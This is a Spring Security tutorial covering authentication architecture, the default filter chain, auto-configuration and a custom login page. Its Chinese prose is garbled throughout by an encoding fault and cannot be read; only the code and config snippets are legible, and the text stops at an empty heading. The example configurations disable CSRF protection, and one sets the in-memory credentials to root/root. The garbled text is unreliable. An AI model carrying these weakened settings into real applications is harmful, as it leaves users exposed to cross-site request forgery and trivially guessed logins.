å¹´4æåå¸äºæ¹ååçç¬¬ä¸ä¸ªçæ¬ spring security 2.0.0ï¼å°ç®åä¸ºæ­¢ï¼spring security çææ°çæ¬å·±ç»å°äº 5.6.1ãå shiro ç¸æ¯ï¼spring securityééçº§å¹¶ä¸éç½®ç¦çï¼ç´è³ä»å¤©ï¼ä¾ç¶æäººä»¥æ­¤ä¸ºçç±èæç»äºè§£ spring securityãå¶å®ï¼èªä» spring boot æ¨åºåï¼å°±å½»åºé¢ è¦äºä¼ ç»äº javaee å¼åï¼èªå¨åéç½®è®©è®¸å¤äºæåå¾éå¸¸å®¹æï¼åæ¬ spring security çéç½®ãå¨ä¸ä¸ª spring boot é¡¹ç®ä¸­ï¼æä»¬çè³åªéè¦å¼å¥ä¸ä¸ªä¾èµï¼ä¸éè¦ä»»ä½é¢å¤éç½®ï¼é¡¹ç®çæææ¥å£å°±ä¼è¢«èªå¨ä¿æ¤èµ·æ¥äºãå¨ spring cloudä¸­ï¼å¾å¤æ¶åå®å¨ç®¡ççé®é¢ï¼ä¹æ¯ä¸ä¸ª spring security ä¾èµä¸¤è¡éç½®å°±è½æå®ï¼å¨å spring å®¶æçäº§åä¸èµ·ä½¿ç¨æ¶ï¼spring security çä¼å¿å°±éå¸¸ææ¾äºã\n\nå æ­¤ï¼å¨å¾®æå¡æ¶ä»£ï¼æä»¬ä¸éè¦çº ç»è¦ä¸è¦å­¦ä¹  spring securityï¼æä»¬è¦èèçæ¯å¦ä½å¿«éææ¡spring securityï¼ å¹¶ä¸è½å¤ä½¿ç¨ spring security å®ç°æä»¬å¾®æå¡çå®å¨ç®¡çã\n\n\n# æ´ä½æ¶æ\n\nå¨spring securityçæ¶æè®¾è®¡ä¸­ï¼è®¤è¯authenticationåææ authorizationæ¯åå¼çï¼æ è®ºä½¿ç¨ä»ä¹æ ·çè®¤è¯æ¹å¼ãé½ä¸ä¼å½±åææï¼è¿æ¯ä¸¤ä¸ªç¬ç«çå­å¨ï¼è¿ç§ç¬ç«å¸¦æ¥çå¥½å¤ä¹ä¸ï¼å°±æ¯å¯ä»¥éå¸¸æ¹ä¾¿å°æ´åä¸äºå¤é¨çè§£å³æ¹æ¡ã\n\n\n\n\n# è®¤è¯åç\n\n# authenticationmanager\n\nå¨spring securityä¸­è®¤è¯æ¯ç±authenticationmanageræ¥å£æ¥è´è´£çï¼æ¥å£å®ä¹ä¸ºï¼\n\n\n\npublic interface authenticationmanager { \n\tauthentication authenticate(authentication authentication) \n  \t\t\t\t\t\t\t\t\t\t\t\t\t\tthrows authenticationexception;\n}\n\n\n1\n2\n3\n4\n\n * è¿å authentication è¡¨ç¤ºè®¤è¯æå\n * è¿å authenticationexception å¼å¸¸ï¼è¡¨ç¤ºè®¤è¯å¤±è´¥ã\n\nauthenticationmanager ä¸»è¦å®ç°ç±»ä¸º providermanagerï¼å¨ providermanager ä¸­ç®¡çäºä¼å¤ authenticationprovider å®ä¾ãå¨ä¸æ¬¡å®æ´çè®¤è¯æµç¨ä¸­ï¼spring security åè®¸å­å¨å¤ä¸ª authenticationprovider ï¼ç¨æ¥å®ç°å¤ç§è®¤è¯æ¹å¼ï¼è¿äº authenticationprovider é½æ¯ç± providermanager è¿è¡ç»ä¸ç®¡ççã\n\n\n\n# authentication\n\nè®¤è¯ä»¥åè®¤è¯æåçä¿¡æ¯ä¸»è¦æ¯ç± authentication çå®ç°ç±»è¿è¡ä¿å­çï¼å¶æ¥å£å®ä¹ä¸ºï¼\n\n\n\npublic interface authentication extends principal, serializable {\n\tcollection<? extends grantedauthority> getauthorities();\n\tobject getcredentials();\n\tobject getdetails();\n\tobject getprincipal();\n\tboolean isauthenticated();\n\tvoid setauthenticated(boolean isauthenticated) throws illegalargumentexception;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * getauthorities è·åç¨æ·æéä¿¡æ¯\n * getcredentials è·åç¨æ·å­è¯ä¿¡æ¯ï¼ä¸è¬æå¯ç \n * getdetails è·åç¨æ·è¯¦ç»ä¿¡æ¯\n * getprincipal è·åç¨æ·èº«ä»½ä¿¡æ¯ï¼ç¨æ·åãç¨æ·å¯¹è±¡ç­\n * isauthenticated ç¨æ·æ¯å¦è®¤è¯æå\n\n# securitycontextholder\n\nsecuritycontextholder ç¨æ¥è·åç»å½ä¹åç¨æ·ä¿¡æ¯ãspring security ä¼å°ç»å½ç¨æ·æ°æ®ä¿å­å¨ session ä¸­ãä½æ¯ï¼ä¸ºäºä½¿ç¨æ¹ä¾¿,spring securityå¨æ­¤åºç¡ä¸è¿åäºä¸äºæ¹è¿ï¼å¶ä¸­æä¸»è¦çä¸ä¸ªååå°±æ¯çº¿ç¨ç»å®ãå½ç¨æ·ç»å½æåå,spring security ä¼å°ç»å½æåçç¨æ·ä¿¡æ¯ä¿å­å° securitycontextholder ä¸­ãsecuritycontextholder ä¸­çæ°æ®ä¿å­é»è®¤æ¯éè¿threadlocal æ¥å®ç°çï¼ä½¿ç¨ threadlocal åå»ºçåéåªè½è¢«å½åçº¿ç¨è®¿é®ï¼ä¸è½è¢«å¶ä»çº¿ç¨è®¿é®åä¿®æ¹ï¼ä¹å°±æ¯ç¨æ·æ°æ®åè¯·æ±çº¿ç¨ç»å®å¨ä¸èµ·ãå½ç»å½è¯·æ±å¤çå®æ¯åï¼spring security ä¼å° securitycontextholder ä¸­çæ°æ®æ¿åºæ¥ä¿å­å° session ä¸­ï¼åæ¶å° securitycontexholder ä¸­çæ°æ®æ¸ç©ºãä»¥åæ¯å½æè¯·æ±å°æ¥æ¶ï¼spring security å°±ä¼åä» session ä¸­ååºç¨æ·ç»å½æ°æ®ï¼ä¿å­å° securitycontextholder ä¸­ï¼æ¹ä¾¿å¨è¯¥è¯·æ±çåç»­å¤çè¿ç¨ä¸­ä½¿ç¨ï¼åæ¶å¨è¯·æ±ç»ææ¶å° securitycontextholder ä¸­çæ°æ®æ¿åºæ¥ä¿å­å° session ä¸­ï¼ç¶åå° security securitycontextholder ä¸­çæ°æ®æ¸ç©ºãè¿ä¸ç­ç¥éå¸¸æ¹ä¾¿ç¨æ·å¨ controllerãservice å±ä»¥åä»»ä½ä»£ç ä¸­è·åå½åç»å½ç¨æ·æ°æ®ã\n\n\n# ææåç\n\nå½å®æè®¤è¯åï¼æ¥ä¸ç±³å°±æ¯ææäºãå¨ spring security çææä½ç³»ä¸­ï¼æä¸¤ä¸ªå³é®æ¥å£ï¼\n\n# accessdecisionmanager\n\n> accessdecisionmanager (è®¿é®å³ç­ç®¡çå¨)ï¼ç¨æ¥å³å®æ­¤æ¬¡è®¿é®æ¯å¦è¢«åè®¸ã\n\n\n\n# accessdecisionvoter\n\n> accessdecisionvoter (è®¿é®å³å®æç¥¨å¨)ï¼æç¥¨å¨ä¼æ£æ¥ç¨æ·æ¯å¦å·å¤åºæçè§è²ï¼è¿èæåºèµæãåå¯¹æèå¼æç¥¨ã\n\n\n\naccessdecisionvoter å accessdecisionmanager é½æä¼å¤çå®ç°ç±»ï¼å¨ accessdecisionmanager ä¸­ä¼æ¢ä¸ªéå accessdecisionvoterï¼è¿èå³å®æ¯å¦åè®¸ç¨æ·è®¿é®ï¼å è accesddecisionvoter å accessdecisionmanager ä¸¤èçå³ç³»ç±»ä¼¼äº authenticationprovider å providermanager çå³ç³»ã\n\n# configattribute\n\n> configattributeï¼ç¨æ¥ä¿å­æææ¶çè§è²ä¿¡æ¯\n\n\n\nå¨ spring security ä¸­ï¼ç¨æ·è¯·æ±ä¸ä¸ªèµæº(éå¸¸æ¯ä¸ä¸ªæ¥å£æèä¸ä¸ª java æ¹æ³)éè¦çè§è²ä¼è¢«å°è£æä¸ä¸ª configattribute å¯¹è±¡ï¼å¨ configattribute ä¸­åªæä¸ä¸ª getattributeæ¹æ³ï¼è¯¥æ¹æ³è¿åä¸ä¸ª string å­ç¬¦ä¸²ï¼å°±æ¯è§è²çåç§°ãä¸è¬æ¥è¯´ï¼è§è²åç§°é½å¸¦æä¸ä¸ª role_ åç¼ï¼æç¥¨å¨ accessdecisionvoter æåçäºæï¼å¶å®å°±æ¯æ¯è¾ç¨æ·æå·åçè§è²åè¯·æ±æä¸ª èµæºæéç configatuibute ä¹é´çå³ç³»ã\n\n\n# helloworld\n\n\n# ç¯å¢æ­å»º\n\n# 0. åå»ºspringboot webé¡¹ç®\n\n<parent>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-parent</artifactid>\n  <version>2.6.6</version>\n  <relativepath/> \x3c!-- lookup parent from repository --\x3e\n</parent>\n\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-thymeleaf</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-web</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 1. ç¼åcontroller\n\npackage com.pwddd.springsecurity.controller;\n\nimport org.springframework.web.bind.annotation.requestmapping;\nimport org.springframework.web.bind.annotation.restcontroller;\n\n@restcontroller\npublic class hellocontroller {\n\n  @requestmapping("hello")\n  public string hello(){\n    system.out.println("hello");\n    return "123";\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 2. æµè¯è®¿é®\n\n\n\n# 3. å¼å¥spring securityä¾èµ\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-security</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\n# 4. ç»ééªè¯\n\nç»éå¯ç ä¸ºæ§å¶å°æå°çå¯ç ï¼é»è®¤ç¨æ·åä¸ºuserã\n\n\n\nç»éä¹åï¼å¯ä»¥æ­£å¸¸è®¿é®ã\n\n\n\né®é¢ï¼\n\n * ä¸ºä»ä¹å¼å¥ spring security ä¹åæ²¡æä»»ä½éç½®ææè¯·æ±å°±è¦è®¤è¯å¢?\n\n * å¨é¡¹ç®ä¸­æææ²¡æç»å½çé¢ï¼ç»å½çé¢æä¹æ¥çå¢ï¼\n\n * ä¸ºä»ä¹ä½¿ç¨ user å æ§å¶å°å¯ç  è½ç»éï¼ç»å½æ¶éªè¯æ°æ®æºå­å¨åªéå¢ï¼\n\n\n# å®ç°åç\n\n# æ¶æå¾\n\nææ¡£å°åï¼https://docs.spring.io/spring-security/site/docs/5.5.4/reference/html5/#servlet-architecture\n\nè½ç¶å¼åèåªéè¦å¼å¥ä¸ä¸ªä¾èµï¼å°±å¯ä»¥è®© spring security å¯¹åºç¨è¿è¡ä¿æ¤ãspring security åæ¯å¦ä½åå°çå¢ï¼\n\nå¨ spring security ä¸­ è®¤è¯ãææ ç­åè½é½æ¯åºäºè¿æ»¤å¨å®æçã\n\n\n\n\n\néè¦æ³¨æçæ¯ï¼é»è®¤è¿æ»¤å¨å¹¶ä¸æ¯ç´æ¥æ¾å¨ web é¡¹ç®çåçè¿æ»¤å¨é¾ä¸­ï¼èæ¯éè¿ä¸ä¸ª flterchainproxy æ¥ç»ä¸ç®¡çãspring security ä¸­çè¿æ»¤å¨é¾éè¿ filterchainproxy åµå¥å° webé¡¹ç®çåçè¿æ»¤å¨é¾ä¸­ãfilterchainproxy ä½ä¸ºä¸ä¸ªé¡¶å±çç®¡çèï¼å°ç»ä¸ç®¡ç security filterãfilterchainproxy æ¬èº«æ¯éè¿ spring æ¡æ¶æä¾ç delegatingfilterproxy æ´åå°åççè¿æ»¤å¨é¾ä¸­ã\n\n# security filters\n\né£ä¹å¨ spring security ä¸­ç»æä»¬æä¾é£äºè¿æ»¤å¨? é»è®¤æåµä¸é£äºè¿æ»¤å¨ä¼è¢«å è½½å¢ï¼\n\nè¿æ»¤å¨                                             è¿æ»¤å¨ä½ç¨                                       é»è®¤æ¯å¦å è½½\nchannelprocessingfilter                         è¿æ»¤è¯·æ±åè®® http ãhttps                          no\nwebasyncmanagerintegrationfilter                å° webasyncmanger ä¸ springsecurity ä¸ä¸æè¿è¡éæ   yes\nsecuritycontextpersistencefilter                å¨å¤çè¯·æ±ä¹å,å°å®å¨ä¿¡æ¯å è½½å° securitycontextholder ä¸­    yes\nheaderwriterfilter                              å¤çå¤´ä¿¡æ¯å å¥ååºä¸­                                  yes\ncorsfilter                                      å¤çè·¨åé®é¢                                      no\ncsrffilter                                      å¤ç csrf æ»å»                                  yes\nlogoutfilter                                    å¤çæ³¨éç»å½                                      yes\noauth2authorizationrequestredirectfilter        å¤ç oauth2 è®¤è¯éå®å                             no\nsaml2webssoauthenticationrequestfilter          å¤ç saml è®¤è¯                                  no\nx509authenticationfilter                        å¤ç x509 è®¤è¯                                  no\nabstractpreauthenticatedprocessingfilter        å¤çé¢è®¤è¯é®é¢                                     no\ncasauthenticationfilter                         å¤ç cas åç¹ç»å½                                 no\noauth2loginauthenticationfilter                 å¤ç oauth2 è®¤è¯                                no\nsaml2webssoauthenticationfilter                 å¤ç saml è®¤è¯                                  no\nusernamepasswordauthenticationfilter            å¤çè¡¨åç»å½                                      yes\nopenidauthenticationfilter                      å¤ç openid è®¤è¯                                no\ndefaultloginpagegeneratingfilter                éç½®é»è®¤ç»å½é¡µé¢                                    yes\ndefaultlogoutpagegeneratingfilter               éç½®é»è®¤æ³¨éé¡µé¢                                    yes\nconcurrentsessionfilter                         å¤ç session æææ                              no\ndigestauthenticationfilter                      å¤ç http æè¦è®¤è¯                                no\nbearertokenauthenticationfilter                 å¤ç oauth2 è®¤è¯ç access token                  no\nbasicauthenticationfilter                       å¤ç httpbasic ç»å½                             yes\nrequestcacheawarefilter                         å¤çè¯·æ±ç¼å­                                      yes\nsecuritycontextholder<br />awarerequestfilter   åè£åå§è¯·æ±                                      yes\njaasapiintegrationfilter                        å¤ç jaas è®¤è¯                                  no\nremembermeauthenticationfilter                  å¤ç rememberme ç»å½                            no\nanonymousauthenticationfilter                   éç½®å¿åè®¤è¯                                      yes\noauth2authorizationcodegrantfilter              å¤çoauth2è®¤è¯ä¸­ææç                               no\nsessionmanagementfilter                         å¤ç session å¹¶åé®é¢                             yes\nexceptiontranslationfilter                      å¤çè®¤è¯/ææä¸­çå¼å¸¸                                 yes\nfiltersecurityinterceptor                       å¤çææç¸å³                                      yes\nswitchuserfilter                                å¤çè´¦æ·åæ¢                                      no\n\nå¯ä»¥çåºï¼spring security æä¾äº 30 å¤ä¸ªè¿æ»¤å¨ã\n\né»è®¤æåµä¸spring boot å¨å¯¹ spring security è¿å¥èªå¨åéç½®æ¶ï¼ä¼åå»ºä¸ä¸ªåä¸º springsecurityfilerchain çè¿æ»¤å¨ï¼å¹¶æ³¨å¥å° spring å®¹å¨ä¸­ï¼è¿ä¸ªè¿æ»¤å¨å°è´è´£ææçå®å¨ç®¡çï¼åæ¬ç¨æ·è®¤è¯ãææãéå®åå°ç»å½é¡µé¢ç­ãå·ä½å¯ä»¥åèwebsecurityconfigurationçæºç :\n\n\n\n\n\n# spring securityèªå¨éç½®åç\n\nspringbootwebsecurityconfigurationè¿ä¸ªç±»æ¯ spring boot èªå¨éç½®ç±»ï¼éè¿è¿ä¸ªæºç å¾ç¥ï¼é»è®¤æåµä¸å¯¹ææè¯·æ±è¿è¡æéæ§å¶ï¼\n\n@configuration(proxybeanmethods = false)\n@conditionalondefaultwebsecurity\n@conditionalonwebapplication(type = type.servlet)\nclass springbootwebsecurityconfiguration {\n\t@bean\n\t@order(securityproperties.basic_auth_order)\n\tsecurityfilterchain defaultsecurityfilterchain(httpsecurity http) \n    throws exception {\n\t\t\thttp.authorizerequests().anyrequest()\n      .authenticated().and().formlogin().and().httpbasic();\n\t\treturn http.build();\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nè¿å°±æ¯ä¸ºä»ä¹å¨å¼å¥ spring security ä¸­æ²¡æä»»ä½éç½®æåµä¸ï¼è¯·æ±ä¼è¢«æ¦æªçåå \n\n\n\nè¿å¥conditionalondefaultwebsecurityæ³¨è§£å¯¹åºçç±»ä¸­ï¼æä»¬å¯ä»¥çåºsecurityçæçæ¡ä»¶æ¯ï¼\n\nclass defaultwebsecuritycondition extends allnestedconditions {\n\n\tdefaultwebsecuritycondition() {\n\t\tsuper(configurationphase.register_bean);\n\t}\n\n\t@conditionalonclass({ securityfilterchain.class, httpsecurity.class })\n\tstatic class classes {\n\n\t}\n\n\t@conditionalonmissingbean({ websecurityconfigureradapter.class, securityfilterchain.class })\n\tstatic class beans {\n\t}\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * æ¡ä»¶ä¸ classpathä¸­å­å¨ securityfilterchain.class, httpsecurity.class\n * æ¡ä»¶äº æ²¡æèªå®ä¹ websecurityconfigureradapter.class, securityfilterchain.class\n\né»è®¤æåµä¸ï¼æ¡ä»¶é½æ¯æ»¡è¶³çãwebsecurityconfigureradapter è¿ä¸ªç±»æå¶éè¦ï¼spring security æ ¸å¿éç½®é½å¨è¿ä¸ªç±»ä¸­ãå¦æè¦å¯¹ spring security è¿è¡èªå®ä¹éç½®ï¼å°±è¦èªå®ä¹è¿ä¸ªç±»å®ä¾ï¼éè¿è¦çç±»ä¸­æ¹æ³è¾¾å°ä¿®æ¹é»è®¤éç½®çç®çã\n\n\n\n# æµç¨åæ\n\n\n\n 1. è¯·æ± /hello æ¥å£ï¼å¨å¼å¥ spring security ä¹åä¼åç»è¿ä¸äºåè¿æ»¤å¨\n 2. å¨è¯·æ±å°è¾¾ filtersecurityinterceptoræ¶ï¼åç°è¯·æ±å¹¶æªè®¤è¯ãè¯·æ±æ¦æªä¸æ¥ï¼å¹¶æåº accessdeniedexception å¼å¸¸ã\n 3. æåº accessdeniedexception çå¼å¸¸ä¼è¢« exceptiontranslationfilter æè·ï¼è¿ä¸ª filter ä¸­ä¼è°ç¨ loginurlauthenticationentrypoint#commence æ¹æ³ç»å®¢æ·ç«¯è¿å 302ï¼è¦æ±å®¢æ·ç«¯è¿è¡éå®åå° /login é¡µé¢ã\n 4. å®¢æ·ç«¯åé /login è¯·æ±ã\n 5. /login è¯·æ±ä¼åæ¬¡è¢«æ¦æªå¨ä¸­ defaultloginpagegeneratingfilter æ¦æªå°ï¼å¹¶å¨æ¦æªå¨ä¸­è¿åçæç»å½é¡µé¢ã\n\nå°±æ¯éè¿è¿ç§æ¹å¼ï¼spring security é»è®¤è¿æ»¤å¨ä¸­çæäºç»å½é¡µé¢ï¼å¹¶è¿åï¼\n\n# ç»éä¿¡æ¯æ ¡éªåç\n\n 1. æ¥ç springbootwebsecurityconfiguration#defaultsecurityfilterchain æ¹æ³è¡¨åç»å½\n\n\n\n 2. å¤çç»å½ä¸º formloginconfigurer ç±»ä¸­ è°ç¨usernamepasswordauthenticationfilterè¿ä¸ªç±»å®ä¾\n\n\n\n 3. æ¥çç±»ä¸­ usernamepasswordauthenticationfilter#attempauthentication æ¹æ³å¾ç¥å®éè°ç¨ authenticationmanager ä¸­ authenticate æ¹æ³\n\n\n\n 4. è°ç¨ providermanager ç±»ä¸­æ¹æ³ authenticate\n\n\n\n 5. è°ç¨äº providermanager å®ç°ç±»ä¸­ abstractuserdetailsauthenticationproviderç±»ä¸­æ¹æ³\n\n\n\n 6. æç»è°ç¨å®ç°ç±» daoauthenticationprovider ç±»ä¸­æ¹æ³æ¯è¾\n\n\n\n\n\nçå°è¿éå°±ç¥éé»è®¤å®ç°æ¯åºäº inmemoryuserdetailsmanager è¿ä¸ªç±»,ä¹å°±æ¯åå­çå®ç°!\n\néè¿æºç åæä¹è½å¾ç¥userdetailserviceæ¯é¡¶å±ç¶æ¥å£ï¼æ¥å£ä¸­loaduserbyusernameæ¹æ³æ¯ç¨æ¥å¨è®¤è¯æ¶è¿è¡ç¨æ·åè®¤è¯æ¹æ³ï¼é»è®¤å®ç°ä½¿ç¨æ¯åå­å®ç°ï¼å¦ææ³è¦ä¿®æ¹æ°æ®åºå®ç°æä»¬åªéè¦èªå®ä¹userdetailserviceå®ç°ï¼æç»è¿å userdetailså®ä¾å³å¯ã\n\n\n\n# userdetailserviceèªå¨éç½®\n\n@configuration(proxybeanmethods = false)\n@conditionalonclass(authenticationmanager.class)\n@conditionalonbean(objectpostprocessor.class)\n@conditionalonmissingbean(\n\t\tvalue = { authenticationmanager.class, authenticationprovider.class, userdetailsservice.class,\n\t\t\t\tauthenticationmanagerresolver.class },\n\t\ttype = { "org.springframework.security.oauth2.jwt.jwtdecoder",\n\t\t\t\t"org.springframework.security.oauth2.server.resource.introspection.opaquetokenintrospector",\n\t\t\t\t"org.springframework.security.oauth2.client.registration.clientregistrationrepository" })\npublic class userdetailsserviceautoconfiguration {\n  //....\n  @bean\n\t@lazy\n\tpublic inmemoryuserdetailsmanager inmemoryuserdetailsmanager(securityproperties properties,\n\t\t\tobjectprovider<passwordencoder> passwordencoder) {\n\t\tsecurityproperties.user user = properties.getuser();\n\t\tlist<string> roles = user.getroles();\n\t\treturn new inmemoryuserdetailsmanager(\n\t\t\t\tuser.withusername(user.getname()).password(getordeducepassword(user, passwordencoder.getifavailable()))\n\t\t\t\t\t\t.roles(stringutils.tostringarray(roles)).build());\n\t}\n  //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 1. ä»èªå¨éç½®æºç ä¸­å¾ç¥å½ classpath ä¸å­å¨ authenticationmanager ç±»\n 2. å½åé¡¹ç®ä¸­ï¼ç³»ç»æ²¡ææä¾ authenticationmanager.classã authenticationprovider.classãuserdetailsservice.classã authenticationmanagerresolver.classãå®ä¾\n\né»è®¤æåµä¸é½ä¼æ»¡è¶³ï¼æ­¤æ¶spring securityä¼æä¾ä¸ä¸ª inmemoryuserdetailmanager å®ä¾\n\n\n\nçæspring bootçèªå¨å è½½åçå¯ä»¥ç¥éï¼å¾å¾ä¸ä¸ªconfigurationé½ä¼å¯¹åºä¸ä¸ªpropertieséç½®ç±»ï¼æä»¬å¯ä»¥åçä¸ä¸è¿ä¸ªéç½®ç±»ï¼\n\n\n\nå¯ä»¥çåºï¼æä»¬å¦æéè¦èªå®ä¹ä¸äºéç½®çè¯ï¼ä½¿ç¨çåç¼æ¯spring.securityãæ¼æ¥ä¸å¯¹åºçå±æ§å³å¯ã\n\n@configurationproperties(prefix = "spring.security")\npublic class securityproperties {\n\tprivate final user user = new user();\n\tpublic user getuser() {\n\t\treturn this.user;\n  }\n  //....\n\tpublic static class user {\n\t\tprivate string name = "user";\n\t\tprivate string password = uuid.randomuuid().tostring();\n\t\tprivate list<string> roles = new arraylist<>();\n\t\tprivate boolean passwordgenerated = true;\n\t\t//get set ...\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nè¿å°±æ¯é»è®¤çæ user ä»¥å uuid å¯ç è¿ç¨! å¦å¤çæç½æºç ä¹åï¼å°±ç¥éåªè¦å¨éç½®æä»¶ä¸­å å¥å¦ä¸éç½®å¯ä»¥å¯¹åå­ä¸­ç¨æ·åå¯ç è¿è¡è¦çã\n\nspring.security.user.name=root\nspring.security.user.password=root\nspring.security.user.roles=admin,users\n\n\n1\n2\n3\n\n\n# æ»ç»\n\nauthenticationmanagerãprovidermangerãä»¥å authenticationprovider å³ç³»\n\n\n\nwebsecurityconfigureradapter æ©å± spring security ææé»è®¤éç½®\n\n\n\nuserdetailservice ç¨æ¥ä¿®æ¹é»è®¤è®¤è¯çæ°æ®æºä¿¡æ¯\n\n\n\n\n# èªå®ä¹è®¤è¯\n\nèªå®ä¹è®¤è¯è¿ä¸é¨ååå«ä»¥ä¸çåå®¹ï¼\n\n * èªå®ä¹èµæºæéè§å\n * èªå®ä¹è®¤è¯çé¢\n * èªå®ä¹è®¤è¯æåå¤ç\n * èªå®ä¹è®¤è¯å¤±è´¥å¤ç\n * èªå®ä¹æ³¨éå¤ç\n * ç»éæååçä¿¡æ¯è·å\n * èªå®ä¹è®¤è¯æ°æ®æº\n * åºäºwebçè®¤è¯æ¡ä¾\n * åºäºååç«¯åç¦»çè®¤è¯æ¡ä¾\n * æ·»å è®¤è¯éªè¯ç \n\n\n# èªå®ä¹èµæºæéè§å\n\né»è®¤æåµä¸ï¼spring securityå¯¹ææå¾é¡µé¢åè®¤è¯è¦æ±ï¼æä»¬å¯ä»¥ä½¿ç¨èªå®ä¹çèµæºæéè§åéå¯¹ä¸åçè¯·æ±ï¼è®¾ç½®ä¸åçèµæºæéè§åã\n\nèªå®ä¹èµæºæéè§åéè¦å¨spring securityçéç½®æä»¶ä¸­æä½ï¼éç½®æä»¶éè¦ç»§æ¿websecurityconfigureradapterç±»ï¼å¹¶éåå¶ä¸­çconfigureæ¹æ³ãå¦ä¸æç¤ºï¼\n\npackage com.pwddd.springsecurity.config;\n\n\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.security.config.annotation.web.builders.httpsecurity;\nimport org.springframework.security.config.annotation.web.configuration.websecurityconfigureradapter;\n\n@configuration\npublic class securityconfig extends websecurityconfigureradapter {\n\n  @override\n  protected void configure(httpsecurity http) throws exception {\n    http.authorizerequests()\n      .mvcmatchers("/index")  // æ·»å å¹é\n      .permitall()  // åè®¸å¨é¨\n      .anyrequest()  // ä»»æè¯·æ±\n      .authenticated()  // éè¦è®¤è¯\n      .and()  // å¹¶ä¸\n      .formlogin()  // è¡¨åç»é\n      .and()  \n      .csrf().disable();  // å³é­csrfæ»å»ä¿æ¤\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# èªå®ä¹è®¤è¯é¡µé¢\n\né»è®¤æä¾çç»éé¡µé¢æ¯ç±defaultloginpagegeneratingfilter.classç±»å¨é¡µé¢ä¸­æä¾çï¼é»è®¤çç»éè¯·æ±å°åä¸ºï¼/loginãæä»¬å¯ä»¥ä¿®æ¹é»è®¤çç»éé¡µé¢ã\n\n# 0. ç¼åç»éé¡µé¢\n\n<!doctype html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="utf-8">\n    <title>login</title>\n</head>\n<body>\n    <h2>ç»é</h2>\n    <form th:action="@{/dologin}" method="post">\n        ç¨æ·åï¼<input type="text" name="uname" ><br>\n        å¯ ç ï¼<input type="password" name="passwd"/> <br>\n        <input type="submit" value="æäº¤">\n    </form>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 1. è®¾ç½®å°ç»å½é¡µé¢çè·¯ç±\n\nregistry.addviewcontroller("/login").setviewname("login");\n\n\n1\n\n\n# 2. è®¾ç½®ç»å½ä¿¡æ¯\n\n@override\nprotected void configure(httpsecurity http) throws exception {\n  http.authorizerequests()\n    .mvcmatchers("/login").permitall() // å¿é¡»æ¾å¼å½åç»å½é¡µé¢çè®¤è¯\n    .mvcmatchers("/index").permitall()\n    .anyrequest()\n    .authenticated()\n    .and()\n    .formlogin()\n    .loginpage("/login")  // è®¾ç½®ç»å½é¡µé¢\n    .loginprocessingurl("/dologin")  // è®¾ç½®ç»å½çè¯·æ±å°å\n    //.successforwardurl("/hello")  // è®¾ç½®æååçè½¬åå°å\n    .defaultsuccessurl("/hello")  // è®¾ç½®æåéå®åå°å\n    .usernameparameter("uname")  // è®¾ç½®è¯·æ±ç¨æ·ååæ°å\n    .passwordparameter("passwd") // è®¾ç½®è¯·æ±å¯ç åæ°å\n    .and()\n    .csrf().disable();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nsuccessforwardurl ãdefaultsuccessurl è¿ä¸¤ä¸ªæ¹æ³é½å¯ä»¥å®ç°æåä¹åè·³è½¬\n\n * successforwardurl é»è®¤ä½¿ç¨ forwardè·³è½¬ æ³¨æ:ä¸ä¼è·³è½¬å°ä¹åè¯·æ±è·¯å¾\n * defaultsuccessurl é»è®¤ä½¿ç¨ redirect è·³è½¬ æ³¨æ:å¦æä¹åè¯·æ±è·¯å¾,ä¼æä¼åè·³è½¬ä¹åè¯·æ±è·¯å¾,å¯ä»¥ä¼ å¥ç¬¬äºä¸ªåæ°è¿è¡ä¿®æ¹\n\n\n# èªå®ä¹è®¤è¯æåå¤ç\n\nå¨ååç«¯åç¦»å¼åä¸­ï¼æä»¬ç»éæååå¾å¾ä¸æ¯è·³è½¬å°æä¸ªé¡µé¢ï¼èæ¯è¿ååç«¯ä¸æ®µjsonæ ¼å¼çæ°æ®ãé£ä¹å°±ä¸è½ä½¿ç¨è½¬åæèéå®åå°ä¸ä¸ªå°åãæä»¬å¯ä»¥éè¿èªå®ä¹çè®¤è¯æåå¤çå¨å®ç°authenticationsuccesshandlerã\n\npublic interface authenticationsuccesshandler {\n\n\t/**\n\t * called when a user has been successfully authenticated.\n\t * @param request the request which caused the successful authentication\n\t * @param response the response\n\t * @param authentication the <tt>authentication</tt> object which was created during\n\t * the authentication process.\n\t */\n\tvoid onauthenticationsuccess(httpservletrequest request, httpservletresponse response,\n\t\t\tauthentication authentication) throws ioexception, servletexception;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\næ ¹æ®æ¥å£çæè¿°ä¿¡æ¯,ä¹å¯ä»¥å¾ç¥ç»å½æåä¼èªå¨åè°è¿ä¸ªæ¹æ³ï¼è¿ä¸æ­¥æ¥çå®çé»è®¤å®ç°ï¼ä½ ä¼åç°successforwardurlãdefaultsuccessurlä¹æ¯ç±å®çå­ç±»å®ç°ç\n\n\n\n# 0. 